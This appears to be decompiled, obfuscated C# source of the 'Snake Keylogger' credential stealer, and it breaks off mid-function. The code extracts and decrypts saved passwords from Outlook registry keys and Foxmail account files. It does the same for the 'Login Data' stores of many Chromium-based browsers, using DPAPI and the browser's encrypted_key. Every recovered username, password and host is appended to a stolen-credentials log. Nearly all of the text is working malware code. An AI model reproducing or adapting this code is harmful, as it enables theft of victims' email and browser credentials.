using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;
using _2ëņ_FFFDĂ;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ݶ_FFFDՄ_061D_FFFD;
using _FFFD䕃Ӻ_FFFD_FFFD;

namespace ȨсӛƚZ;

[StandardModule]
internal sealed class _2964_FFFDή_06DAô
{
	internal sealed class RecoveredApplicationAccount
	{
		private string _appName;

		private string _username;

		private string _password;

		private string _URL;

		internal string UserName
		{
			get
			{
				return _username;
			}
			set
			{
				_username = value;
			}
		}

		internal string Password
		{
			get
			{
				return _password;
			}
			set
			{
				_password = value;
			}
		}

		internal string URL
		{
			get
			{
				return _URL;
			}
			set
			{
				_URL = value;
			}
		}

		internal string appName
		{
			get
			{
				return _appName;
			}
			set
			{
				_appName = value;
			}
		}
	}

	[Flags]
	public enum CryptProtectPromptFlags
	{
		CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
		CRYPTPROTECT_PROMPT_ON_PROTECT = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct CRYPTPROTECT_PROMPTSTRUCT
	{
		public int cbSize;

		public CryptProtectPromptFlags dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DATA_BLOB
	{
		public int cbData;

		public IntPtr pbData;
	}

	private static byte[] OΩʤ_FFFDӛ = new byte[11]
	{
		131, 125, 252, 15, 142, 179, 232, 105, 115, 175,
		255
	};

	private static byte[] _F0B9_0040_F0B9ٷ_FFFD = new byte[4] { 0, 0, 0, 8 };

	private static string _02F3ε뫆_0327_005E = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string _FFFD뫆䕃_05C1ݝ;

	private static string U_FFFDK_05C9Α;

	public static string _07A8թ츠іߡ = "";

	public static int ę_07B8ʭ_0306皍 = 0;

	public static int O_00AB_FFFD_FFFDΑ = 0;

	public static void _0300У蠺ϫζ()
	{
		List<RecoveredApplicationAccount> list = new List<RecoveredApplicationAccount>();
		list = _FFFD꼺_FFFDz_06E8();
		if (list.Count <= 0)
		{
			return;
		}
		foreach (RecoveredApplicationAccount item in list)
		{
			string text = "\r\n-------- Snake Keylogger --------\r\nFound From: Outlook\r\nURL: " + item.URL + "\r\nE-Mail: " + item.UserName + "\r\nPSWD: " + item.Password + "\r\n---------------------------------\r\n ";
			鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text;
		}
	}

	internal static List<RecoveredApplicationAccount> _FFFD꼺_FFFDz_06E8()
	{
		List<RecoveredApplicationAccount> list = new List<RecoveredApplicationAccount>();
		string[] array = new string[4] { "IMAP Password", "POP3 Password", "HTTP Password", "SMTP Password" };
		string text = null;
		RegistryKey[] array2 = new RegistryKey[4]
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"),
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"),
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"),
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676")
		};
		RegistryKey[] array3 = array2;
		foreach (RegistryKey registryKey in array3)
		{
			if (registryKey == null)
			{
				continue;
			}
			string[] subKeyNames = registryKey.GetSubKeyNames();
			foreach (string name in subKeyNames)
			{
				using RegistryKey registryKey2 = registryKey.OpenSubKey(name);
				UTF8Encoding uTF8Encoding = new UTF8Encoding();
				if (!((registryKey2.GetValue("Email") != null) & ((registryKey2.GetValue("IMAP Password") != null) | (registryKey2.GetValue("POP3 Password") != null) | (registryKey2.GetValue("HTTP Password") != null) | (registryKey2.GetValue("SMTP Password") != null))))
				{
					continue;
				}
				string[] array4 = array;
				foreach (string name2 in array4)
				{
					if (registryKey2.GetValue(name2) != null)
					{
						byte[] array5 = (byte[])registryKey2.GetValue(name2);
						text = _02F3ջ_00BEZ_0026(array5);
					}
				}
				object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("Email"));
				byte[] bytes;
				try
				{
					object[] obj = new object[1] { objectValue };
					object[] array6 = obj;
					bool[] obj2 = new bool[1] { true };
					bool[] array7 = obj2;
					object obj3 = NewLateBinding.LateGet((object)uTF8Encoding, (Type)null, "GetBytes", obj, (string[])null, (Type[])null, obj2);
					if (array7[0])
					{
						objectValue = RuntimeHelpers.GetObjectValue(array6[0]);
					}
					bytes = (byte[])obj3;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					bytes = (byte[])objectValue;
					ProjectData.ClearProjectError();
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("SMTP Server"));
				byte[] bytes2;
				if (objectValue2 != null)
				{
					try
					{
						object[] obj4 = new object[1] { objectValue2 };
						object[] array6 = obj4;
						bool[] obj5 = new bool[1] { true };
						bool[] array7 = obj5;
						object obj6 = NewLateBinding.LateGet((object)uTF8Encoding, (Type)null, "GetBytes", obj4, (string[])null, (Type[])null, obj5);
						if (array7[0])
						{
							objectValue2 = RuntimeHelpers.GetObjectValue(array6[0]);
						}
						bytes2 = (byte[])obj6;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						bytes2 = (byte[])objectValue2;
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					bytes2 = uTF8Encoding.GetBytes("Nothing");
				}
				RecoveredApplicationAccount recoveredApplicationAccount = new RecoveredApplicationAccount();
				recoveredApplicationAccount.URL = uTF8Encoding.GetString(bytes2).Replace("\0", "");
				recoveredApplicationAccount.UserName = uTF8Encoding.GetString(bytes).ToString().Replace(Conversions.ToString(Convert.ToChar(0)), "");
				recoveredApplicationAccount.Password = text.Replace(Conversions.ToString(Convert.ToChar(0)), "");
				recoveredApplicationAccount.appName = "Outlook";
				list.Add(recoveredApplicationAccount);
			}
		}
		return new List<RecoveredApplicationAccount>(list);
	}

	public static string _02F3ջ_00BEZ_0026(byte[] Ӥ_FFFDל_065A丐)
	{
		checked
		{
			byte[] array = new byte[Ӥ_FFFDל_065A丐.Length - 2 + 1];
			Buffer.BlockCopy(Ӥ_FFFDל_065A丐, 1, array, 0, Ӥ_FFFDל_065A丐.Length - 1);
			string @string = Encoding.UTF8.GetString(ProtectedData.Unprotect(array, (byte[])null, (DataProtectionScope)0));
			return @string.Replace(Conversions.ToString(Convert.ToChar(0)), "");
		}
	}

	public static void ƌ_FFFDс_FFFD늻()
	{
		checked
		{
			try
			{
				string text = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command")!.GetValue("")!.ToString();
				text = text.Remove(text.LastIndexOf("Foxmail.exe")).Replace("\"", "") + "Storage\\";
				string[] directories = Directory.GetDirectories(text);
				foreach (string text2 in directories)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(text2);
					string text3 = text2.Substring(text2.LastIndexOf("\\") + 1);
					string path = text2 + "\\Accounts\\Account.rec0";
					FileStream fileStream = new FileStream(path, FileMode.Open);
					int num = (int)fileStream.Length;
					byte[] array = new byte[num - 1 + 1];
					bool flag = false;
					string text4 = "";
					fileStream.Read(array, 0, num);
					int num2 = ((array[0] != 208) ? 1 : 0);
					int num3 = num - 1;
					for (int j = 0; j <= num3; j++)
					{
						if (array[j] > 32 && array[j] < 127 && array[j] != 61)
						{
							string text5 = text4;
							text4 = text5 + Strings.ChrW(unchecked((int)array[j]));
							string text6 = "";
							if (text4.Equals("Account") || text4.Equals("POP3Account"))
							{
								int k = j + 9;
								if (num2 == 0)
								{
									k = j + 2;
								}
								for (; array[k] > 32 && array[k] < 127; k++)
								{
									string text7 = text6;
									text6 = text7 + Strings.ChrW(unchecked((int)array[k]));
								}
								flag = true;
								j = k;
							}
							else if (flag && (text4.Equals("Password") || text4.Equals("POP3Password")))
							{
								int l = j + 9;
								if (num2 == 0)
								{
									l = j + 2;
								}
								string text8 = "";
								for (; array[l] > 32 && array[l] < 127; l++)
								{
									string text9 = text8;
									text8 = text9 + Strings.ChrW(unchecked((int)array[l]));
								}
								if (!((Operators.CompareString(text3, "", false) == 0) & (Operators.CompareString(text8, "", false) == 0)))
								{
									text8 = text8.Replace("!", "");
									string text10 = "\r\n-------- Snake Keylogger --------\r\nFound From: Foxmail\r\n" + $"E-Mail: {text3}" + "\r\n" + $"PSWD: {_FFFDޗΑtЮ(num2, text8)}" + "\r\n---------------------------------\r\n ";
									鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text10;
								}
								break;
							}
						}
						else
						{
							text4 = "";
						}
					}
					fileStream.Close();
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string _FFFDޗΑtЮ(int ٷթ_FFFD_003Bë, string ߟԜņ뫆ǎ)
	{
		string text = "";
		int[] array = new int[8] { 126, 100, 114, 97, 71, 111, 110, 126 };
		int[] array2 = new int[8] { 126, 70, 64, 55, 37, 109, 36, 126 };
		int num = Convert.ToInt32("5A", 16);
		if (ٷթ_FFFD_003Bë == 1)
		{
			array = array2;
			num = Convert.ToInt32("71", 16);
		}
		checked
		{
			int num2 = (int)Math.Round((double)ߟԜņ뫆ǎ.Length / 2.0);
			int num3 = 0;
			int[] array3 = new int[num2 - 1 + 1];
			int num4 = num2 - 1;
			for (int i = 0; i <= num4; i++)
			{
				array3[i] = Convert.ToInt32(ߟԜņ뫆ǎ.Substring(num3, 2), 16);
				num3 += 2;
			}
			int[] array4 = new int[array3.Length - 1 + 1];
			array4[0] = array3[0] ^ num;
			Array.Copy(array3, 1, array4, 1, array3.Length - 1);
			while (array3.Length > array.Length)
			{
				int[] array5 = new int[array.Length * 2 - 1 + 1];
				Array.Copy(array, 0, array5, 0, array.Length);
				Array.Copy(array, 0, array5, array.Length, array.Length);
				array = array5;
			}
			int[] array6 = new int[array3.Length - 1 + 1];
			int num5 = array3.Length - 1;
			for (int j = 1; j <= num5; j++)
			{
				array6[j - 1] = array3[j] ^ array[j - 1];
			}
			int[] array7 = new int[array6.Length - 1 + 1];
			int num6 = array6.Length - 1 - 1;
			for (int k = 0; k <= num6; k++)
			{
				if (array6[k] - array4[k] < 0)
				{
					array7[k] = array6[k] + 255 - array4[k];
				}
				else
				{
					array7[k] = array6[k] - array4[k];
				}
				text += Strings.ChrW(array7[k]);
			}
			return text;
		}
	}

	public static bool ε_065ACݝ_FFFD(string ϒ_07BB_07B8с_02F3)
	{
		if (Operators.CompareString(ϒ_07BB_07B8с_02F3.Substring(0, 3), "v10", false) == 0)
		{
			return true;
		}
		return false;
	}

	public static byte[] _07FBƉ_FFFDջ퓜(string _FFFDʪ߂ē_FFFD)
	{
		string path = _FFFDʪ߂ē_FFFD + "\\Local State";
		byte[] array = new byte[0];
		checked
		{
			byte[] result;
			if (!File.Exists(path))
			{
				result = null;
			}
			else
			{
				MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path));
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = matchCollection.GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						Match match = (Match)objectValue;
						if (match.Success)
						{
							array = Convert.FromBase64String(match.Groups[1].Value);
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				byte[] array2 = new byte[array.Length - 5 - 1 + 1];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				try
				{
					result = ProtectedData.Unprotect(array2, (byte[])null, (DataProtectionScope)0);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Console.WriteLine(ex2.ToString());
					result = null;
					ProjectData.ClearProjectError();
				}
			}
			return result;
		}
	}

	public static string ﾭޗӥƌ_F0B9(byte[] ɩŚj_0040Ԍ, byte[] 恁_07B9Ц_2964ӓ)
	{
		byte[] array = new byte[12];
		Array.Copy(ɩŚj_0040Ԍ, 3, array, 0, 12);
		checked
		{
			string result;
			try
			{
				byte[] array2 = new byte[ɩŚj_0040Ԍ.Length - 15 - 1 + 1];
				Array.Copy(ɩŚj_0040Ԍ, 15, array2, 0, ɩŚj_0040Ԍ.Length - 15);
				byte[] array3 = new byte[16];
				byte[] array4 = new byte[array2.Length - array3.Length - 1 + 1];
				Array.Copy(array2, array2.Length - 16, array3, 0, 16);
				Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
				Ś_FFFD丐ԜƟ ś_FFFD丐ԜƟ = new Ś_FFFD丐ԜƟ();
				string @string = Encoding.UTF8.GetString(ś_FFFD丐ԜƟ._0332_DA3B_DD61ӓУ(恁_07B9Ц_2964ӓ, array, null, array4, array3));
				result = @string;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Console.WriteLine(ex2.ToString());
				result = null;
				ProjectData.ClearProjectError();
			}
			return result;
		}
	}

	public static void _FFFDױߡz_0332()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Kinza\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Kinza\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Ц_FFFDɛɢ_061D()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Sputnik\\Sputnik\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Sputnik\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void 鈇ƉZʪņ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Sputnik\\Sputnik\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Falkon\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _0089أݝ_0314ջ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\SalamWeb\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: SalamWeb\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Қٵŧ_05B4_2964()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\MapleStudio\\ChromePlus\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: CoolNovo\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Π_06E8ٷ_0040m()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\QIP Surf\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: QIP Surf\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void ë_0314_FFFDɇՕ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BlackHawk\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Black Hawk\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void @Մ_032Eϫ_0332()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\7Star\\7Star\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: 7Star\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _FFFD蠺ʪĪҭ()
	{
		string text = Interaction.Environ("APPDATA") + "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Sleipnir\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void ל_00ABݝ_FFFDĂ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\CatalinaGroup\\Citrio\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Citrio\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
